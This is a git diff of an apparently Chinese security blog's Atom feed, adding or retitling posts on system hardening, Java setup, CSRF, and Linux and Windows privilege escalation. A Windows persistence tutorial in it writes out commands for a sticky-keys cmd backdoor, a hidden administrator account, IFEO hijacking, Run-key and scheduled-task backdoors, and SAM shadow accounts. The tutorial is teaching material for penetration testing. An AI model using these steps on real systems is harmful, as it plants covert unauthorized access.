+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">在使用Ctrl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Alt</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Dl或密码保护的屏幕保护程序锁定的工作站或</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">成员服务器上的密码尝试失败将计作登录尝试失败。</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">默认值：</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h4>本地策略</h4>
+<p>​​</p>
+<h5>审核策略</h5>
+<p>​​</p>
+<p>日志记录设置</p>
+<p>​​</p>
+<h5>用户权限分配</h5>
+<h6>从远程系统强制关机</h6>
+<p>安全推荐配置：远程关机只能管理员组或禁用。</p>
+<p>​​</p>
+<h6>关闭系统</h6>
+<p>添加可以关闭系统的用户或组</p>
+<p>​​</p>
+<h6>取得文件或其他对象的使用权</h6>
+<p>默认admin 检查是否有新增用户</p>
+<p>​​</p>
+<p>​​</p>
+<h6>允许本地登录</h6>
+<p>根据业务需要修改</p>
+<p>​​</p>
+<h6>允许通过远程桌面服务登录</h6>
+<p>根据业务修改</p>
+<p>​​</p>
+<h6>从网络访问计算机</h6>
+<p>​​</p>
+<h5>安全选项</h5>
+<p>设置暂停会话前所需空闲时间数量</p>
+<p>​​</p>
+<h4>其他</h4>
+<ol>
+<li>
+<p>安装企业级防病毒软件 病毒库跟新、</p>
+</li>
+<li>
+<p>屏幕保护程序设置密码</p>
+</li>
+<li>
+<p>安全更新补丁（方法因系统而异）</p>
+<p>Windows 10 ：设置--安全更新--windows更新--高级选项--接收更新</p>
+<p>Windows other ↓ ：</p>
+<p>​​</p>
+</li>
+</ol>
+]]></content>
     <category term="应急响应"/>
     <published>2024-10-14T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">数据库安全加固</title>
-    <id>https://min168.top/response/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html</id>
-    <link href="https://min168.top/response/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html"/>
-    <updated>2025-12-05T16:22:10.000Z</updated>
+    <title type="text">数据库安全加固最佳实践指南</title>
+    <id>https://min168.top/response/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/response/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h2><strong>MySql安全加固</strong></h2>
 <h3>账号安全</h3>
 <h4>配置文件</h4>
@@ -13349,10 +13306,10 @@ True</p>
     <published>2023-12-10T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">CSRF</title>
-    <id>https://min168.top/perm/CSRF%E6%BC%8F%E6%B4%9E.html</id>
-    <link href="https://min168.top/perm/CSRF%E6%BC%8F%E6%B4%9E.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">CSRF跨站请求伪造漏洞分析与防御</title>
+    <id>https://min168.top/perm/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1.html</id>
+    <link href="https://min168.top/perm/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>跨站请求伪造(Cross-site request forgery,CSRF)是一种攻击，它强制终端用户在当前对其进行&lt;span data-type="text" style="color: var(--b3-font-color9);"&gt;身份验证后的Web应用程序<br>
 上执行非本意的操作&lt;span&gt;。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数据，因为攻击者无法查看对伪造请求的响应</p>
 <h3>CSRF漏洞的原理</h3>
@@ -13504,10 +13461,50 @@ jsonp只能get请求。CORS允许浏览器向跨域服务器发出XMLHttpRequest
     <published>2023-03-25T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">Linux权限维持</title>
-    <id>https://min168.top/perm/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</id>
-    <link href="https://min168.top/perm/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">Java安全测试环境配置指南</title>
+    <id>https://min168.top/perm/Java%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/perm/Java%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[
+<h3>windows     Linux见： Linux centos7 java环境配置</h3>
+<p>JRE8安装目录为C:\Program Files\Java\jre1.8.0_221</p>
+<p>​​</p>
+<p>打开环境变量的步骤：</p>
+<p>点击开始，右键选中我的电脑，点击属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量。</p>
+<p>1、设置JAVA_HOME</p>
+<p>JAVA_HOME：C:\Program Files\Java\jre1.8.0_221（JRE安装路径）</p>
+<p>​​</p>
+<p>​​</p>]]></summary>
+    <content type="html"><![CDATA[
+<h3>windows     Linux见： Linux centos7 java环境配置</h3>
+<p>JRE8安装目录为C:\Program Files\Java\jre1.8.0_221</p>
+<p>​​</p>
+<p>打开环境变量的步骤：</p>
+<p>点击开始，右键选中我的电脑，点击属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量。</p>
+<p>1、设置JAVA_HOME</p>
+<p>JAVA_HOME：C:\Program Files\Java\jre1.8.0_221（JRE安装路径）</p>
+<p>​​</p>
+<p>​​</p>
+<p>2、设置CLASSPATH</p>
+<p>CLASSPATH：.;%java_home%\lib;%java_home%\lib\tools.jar（注意前面的.）</p>
+<p>​​</p>
+<p>3、设置Path</p>
+<p>Path: C:\Program Files\Java\jre1.8.0_221\bin</p>
+<p>​​</p>
+<p>我们可以验证一下</p>
+<p>在CMD窗口输入：java -version</p>
+<p>​​</p>
+<p>可以正常显示版本号，这样就可以正确使用JRE了</p>
+<p>‍</p>
+]]></content>
+    <category term="渗透测试"/>
+    <published>2023-12-18T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">Linux权限维持技术与后门持久化</title>
+    <id>https://min168.top/perm/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html</id>
+    <link href="https://min168.top/perm/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h2>ssh公钥免密后门</h2>
 <h3>公钥私钥原理概述</h3>
 <p>公钥和私钥同时生成，<strong>公钥用于加密，私钥用于解密</strong>。公钥可以有很多人持有，但是私钥只能自己持有，在ssh服务中，将客户端生成的ssh公钥写到目标服务器的 ~/.ssh/authorized keys中,之后客户端利用私钥完成认证即可登录 <span data-type="text" style="color: var(--b3-font-color8);">该后门比较容易被发现(查看/root/.ssh/有几个公钥)。</span></p>
@@ -13663,10 +13660,10 @@ jsonp只能get请求。CORS允许浏览器向跨域服务器发出XMLHttpRequest
     <published>2023-09-01T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">Linux系统提权</title>
-    <id>https://min168.top/perm/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html</id>
-    <link href="https://min168.top/perm/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">Linux系统提权技术与实战案例</title>
+    <id>https://min168.top/perm/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html</id>
+    <link href="https://min168.top/perm/Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>Liux安装好系统后里面自带的软件或内核存在的漏洞，比较流行的有“脏牛提权”<br>
 Linux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权</p>
 <h2>步骤</h2>
@@ -14018,10 +14015,10 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
     <published>2023-09-12T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">PHP代码审计</title>
-    <id>https://min168.top/perm/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html</id>
-    <link href="https://min168.top/perm/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">PHP代码审计技术与实战案例</title>
+    <id>https://min168.top/perm/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html</id>
+    <link href="https://min168.top/perm/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <p>靶场 <a href="https://github.com/virink/VAuditDemo" target="_blank" rel="noopener noreferrer">VAuditDemo</a></p>
 <h3>安装漏洞</h3>
@@ -14051,10 +14048,423 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
     <published>2023-09-18T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">XSS-lab</title>
-    <id>https://min168.top/perm/XSS-lab.html</id>
-    <link href="https://min168.top/perm/XSS-lab.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">Windows权限维持技术与后门持久化</title>
+    <id>https://min168.top/perm/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html</id>
+    <link href="https://min168.top/perm/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
+<h2>shift后门(shift backdoor)</h2>
+<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>]]></summary>
+    <content type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
+<h2>shift后门(shift backdoor)</h2>
+<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>
+<p>比较老的方式 在winodws中有一些辅助功能，能在用户未登录系统之前就通过组合键来启动 Windows的粘滞键 在Windows系统按5下shift后，Windows就运行了System32下的sethc.exe,启动粘滞键粘滞键的位置:C:\windows\system32\sethc.exe</p>
+<h3>shift后门原理</h3>
+<p>把 cmd.exe 这个程序更名为 sethc.exe，并且把原来的sethc.exe替换掉 之后在登录界面连续按下5次shift键后，系统会以system权限运行cmd.exe 那么此时的 cmd.exe 就具有了管理权限，之后只要利用cmd增加一个管理员用户就可以登录进去，实现隐藏后门</p>
+<h3>shift后门制作</h3>
+<p>用 cmd.exe 替换 windows\system32 目录下的粘滞键可执行文件sethc.exe</p>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cd c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32 </span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">move sethc.exe sethc.exe.bak </span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">copy cmd.exe sethc.exe</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<p>拒绝访问将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)</p>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">takeown </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32\*.*   /a /r /d y</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cacls  c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32\*.*  /T /E /G administrators:F</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>重新替换</p>
+<p>​​</p>
+<p>锁定界面5次shift后</p>
+<p>​​</p>
+<p>将其添加用户到管理员用户组</p>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net user xiao </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">123456</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add </span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">&amp;&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> net localgroup administrators xiao </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
+<p>​​</p>
+<h3>shift后门防御</h3>
+<ul>
+<li>在远程登录服务器时，连续按5次 shift 键，判断服务器是否被入侵</li>
+<li>禁用该 sethc.exe 功能 或者在“控制面板”中关闭“连续按5次shift键时启用粘滞键选项</li>
+<li>使用权限约束 sethc.exe，使任何人都不能访问它</li>
+</ul>
+<h2>映像劫持 IFEO(lmage File Execution Options)</h2>
+<h3>映像劫持原理</h3>
+<p>在高版本的windows版本中<span data-type="text" style="color: var(--b3-font-color8);">替换的文件受到了系统的保护</span>，所以需要进行"映像劫持“ 可以理解为当打开a.exe程序实际打开的却是b.exe程序，那么a程序就是被b程序劫持了。是为一些在默认系统环境中运行时可能引发错误的 程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大，默认是只有管理员和 local system有权读写修改.</p>
+<h3>制作映像劫持</h3>
+<ol>
+<li>
+<p>粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe</p>
+</li>
+<li>
+<p>regdit</p>
+</li>
+<li>
+<p>HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Image File ExecutionOption  新建项 sethc.exe</p>
+<p>​​</p>
+</li>
+<li>
+<p>在新建的项中添加debugger键，键值设置为恶意程序的路径</p>
+<p>​​</p>
+</li>
+<li>
+<p>这里用cmd路径代替。cmd路径：C:\Windows\system32\cmd.exe</p>
+<p>​​</p>
+</li>
+<li>
+<p>锁定访问</p>
+<p>​​</p>
+</li>
+</ol>
+<p>​​</p>
+<h2>启动项、计划任务</h2>
+<h3>注册表自启动后门</h3>
+<p>通过修改注册表实现自动启动需要运行程序</p>
+<p>最常见的在指定键值添加一个新的键值类型为 REG SZ,数据项中添写需要运行程序的路径即可以启动</p>
+<ol>
+<li>
+<p>打开注册表路径：HKEY LOCAL MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</p>
+</li>
+<li>
+<p>添加一个键值类型为REG SZ</p>
+</li>
+<li>
+<p>在数据中填写需要运行程序的路径</p>
+<p>​</p>
+</li>
+<li>
+<p>开机自动弹出</p>
+<p>​​</p>
+</li>
+</ol>
+<h3>计划任务后门</h3>
+<p>计划任务在 Windows7 及之前版本的操作系统中使用 <span data-type="text" style="color: var(--b3-font-color8);">at </span>命令调用，从 Windows8 等高版本的操作系统中使 用 <span data-type="text" style="color: var(--b3-font-color8);">schtasks </span>命令调用</p>
+<p>at命令是只会打开一个后台进程，而schtasks命令是将定时的任务在前台执行</p>
+<h4>at命令的参数</h4>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">AT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">\computername] time [/INTERACTIVE] [ /EVERY:date[...]/NEXT:date....]] "command'</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>schtasks命令的参数</h4>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn TaskName </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr TaskRun </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc schedule [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo modifier] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d day] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">m monthl,month.] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i ldieTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">st StartTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sd StartDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ed EndDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">s computer [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">u [domain\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">juser /p password]] [/ru {[Domain\]User "System"} [/rp Password]] /?</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>计划任务后门制作</h4>
+<p>计划任务后门分为管理员权限和普通权限两种，管理员权限的后门可以设置更多的计划任务，例如重启后运行等</p>
+<p>创建计划后门的基本命令</p>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr cmd.exe </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc minute </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        #该命令表示每分钟执行一次cmd.exe</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">                                  #查看某计划任务:将“任务名称”替换为您要查看的任务的实际名称。</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query                                             </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#查看所有计划任务：然后按Enter键。</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h2>影子账户</h2>
+<p>在注册表中打开 HKEY LOCAL MACHINE/SAM/SAM/Domains/Account/Users/选项，点击Names菜单 注意:如果进入SAM后无法再看到里面的子选项，需要给予administrators完全控制权限，并重新进入注册表</p>
+<ol>
+<li>
+<p>创建隐藏账户</p>
+<p>​​</p>
+</li>
+<li>
+<p>打开注册表  给权限 <span data-type="text" style="color: var(--b3-font-color8);"> 给完权限查询打开</span></p>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">HEKY_LOCAL_MACHINE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">SAM\SAM\Domains\Account\User在SAM\SAM</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
+</li>
+<li>
+<p>“Users”里包含的就是该帐户的权限的键值</p>
+<p>​​</p>
+</li>
+<li>
+<p>把Administrator的F键值的内容替换掉hack的F键值（这样hack也有管理员权限了）</p>
+<p>​​</p>
+</li>
+<li>
+<p>将隐藏用户的名字和权限注册表导出</p>
+<p>​​</p>
+</li>
+<li>
+<p>删除账户</p>
+<p>​​</p>
+</li>
+<li>
+<p>双击两个文件添加</p>
+<p>​​</p>
+</li>
+<li>
+<p>影子用户创建完成，net user和计算机管理中都看不见zxk$用户，只有注册表中可以看见，且具有管理员权限</p>
+<p>​​</p>
+</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+]]></content>
+    <category term="渗透测试"/>
+    <published>2023-09-20T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">Windows系统提权技术与实战案例</title>
+    <id>https://min168.top/perm/Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html</id>
+    <link href="https://min168.top/perm/Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<h4>windows提权分类</h4>
+<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
+3.第三方软件/服务提权<br>
+2.数据库提权<br>
+4.系统配置错误提权</p>
+<h4>windows提权概述</h4>
+<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
+windows:</p>
+<p>user--&gt;System<br>
+user--&gt;Administrator</p>]]></summary>
+    <content type="html"><![CDATA[<h4>windows提权分类</h4>
+<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
+3.第三方软件/服务提权<br>
+2.数据库提权<br>
+4.系统配置错误提权</p>
+<h4>windows提权概述</h4>
+<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
+windows:</p>
+<p>user--&gt;System<br>
+user--&gt;Administrator</p>
+<p>Linux:<br>
+user--&gt;Root</p>
+<h4>windows提权流程</h4>
+<p>获得目标机shll=&gt;查看补丁记录=&gt;寻找对应EXP=&gt;使用Exp提权</p>
+<h4>1.windows系统漏洞提权</h4>
+<ol>
+<li>
+<p>查看这台主机还有哪些漏洞没有修复</p>
